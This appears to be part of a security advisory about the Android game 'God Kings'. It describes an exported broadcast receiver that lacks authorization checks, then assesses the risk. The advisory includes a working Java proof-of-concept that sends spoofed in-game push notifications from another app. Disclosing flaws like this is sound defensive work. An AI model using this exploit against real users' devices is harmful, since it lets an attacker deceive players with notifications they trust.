5. VULNERABILITY DETAILS
========================
The "God Kings" app for Android exposes a broadcast receiver to other apps called
"com.innogames.core.frontend.notifications.receivers.LocalNotificationBroadcastReceiver".
The purpose of this broadcast receiver is to receive and display in-game push
notifications to the player.

However, the app does not enforce any authorization schema on the broadcast receiver,
thus allowing an attacker (malicious app) to send fully customizable in-game push
notifications to the player. An exemplary exploit could look like the following:

Intent i = new Intent();
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
i.setComponent(new ComponentName("com.innogames.gkandroid", "com.innogames.core.frontend.notifications.receivers.LocalNotificationBroadcastReceiver"));
i.setAction("android.intent.action.MAIN");

Bundle bundle = new Bundle();
bundle.putString("title", "title");
bundle.putString("body", "body");
bundle.putString("tickerText", "tickerText");
bundle.putString("smallIcon" ,"smallIcon");
bundle.putString("largeIcon", "largeIcon");
bundle.putBoolean("displayedInForeground", true);

UserInfo userinfo = new UserInfo("1", "2");
bundle.putParcelable("user_info", userinfo);

i.putExtra("NotificationExtra", bundle);
sendBroadcast(i);


6. RISK
=======
A malicious app on the same device is able to exploit this vulnerability to show
arbitrary in-game push notifications to the player. The specific problem here is the
assumed trust boundary between the user having the God Kings app installed and
what the app is actually doing/displaying to the user. So if the player sees the in-game
notification, it can be assumed that the shown content is also trusted by the user.
